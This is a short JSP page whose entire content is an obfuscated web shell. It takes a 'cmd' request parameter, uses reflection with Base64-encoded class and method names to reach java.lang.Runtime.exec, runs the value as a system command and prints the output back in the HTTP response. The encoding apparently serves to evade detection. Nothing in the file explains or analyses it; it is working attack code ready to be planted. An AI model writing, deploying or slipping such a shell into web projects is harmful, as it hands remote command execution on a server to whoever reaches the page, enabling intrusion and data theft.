<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.Base64" %>
<%@ page language="java" pageEncoding="UTF-8" %>
<%

  String cmd = request.getParameter(new String(Base64.getDecoder().decode("Y21k"),"utf-8"));
  Class<?> rt =Class.forName(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWU="),"utf-8"));

  Method runtimeMethod = rt.getMethod(new String(Base64.getDecoder().decode("Z2V0UnVudGltZQ=="),"utf-8"));
  Method method = rt.getMethod(new String(Base64.getDecoder().decode("ZXhlYw=="),"utf-8"), String.class);
  Object object = method.invoke(runtimeMethod.invoke(null),cmd);
  Process process = (Process) object;

  InputStream is = process.getInputStream();
  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));
  String r = null;
  while((r = bufferedReader.readLine())!=null){
    response.getWriter().println(r);
  }
%>